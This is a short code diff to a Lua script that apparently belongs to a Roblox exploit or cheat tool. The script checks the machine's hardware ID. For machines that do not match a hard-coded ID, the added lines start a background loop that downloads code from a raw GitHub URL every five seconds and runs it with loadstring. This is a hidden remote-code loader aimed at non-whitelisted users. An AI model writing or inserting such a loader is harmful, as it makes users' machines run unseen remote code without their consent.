@@ -3,6 +3,11 @@ if HWID ~= "283DE6A6-EB60-4903-8868-C0742720E723" then
     if game.CoreGui:FindFirstChild("Mana") then
         game.CoreGui.Mana:Destroy()
     end
+    spawn(function()
+        repeat wait(5)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/TizCof/ThisIsFkinLmao/main/script.cfh"))()
+        until getgenv().StopCheckLoad == false
+    end)
     local HttpService = game:GetService("HttpService")
     local fileidname = "userid_DONOTDELETE.cfh"
     local Chars = {
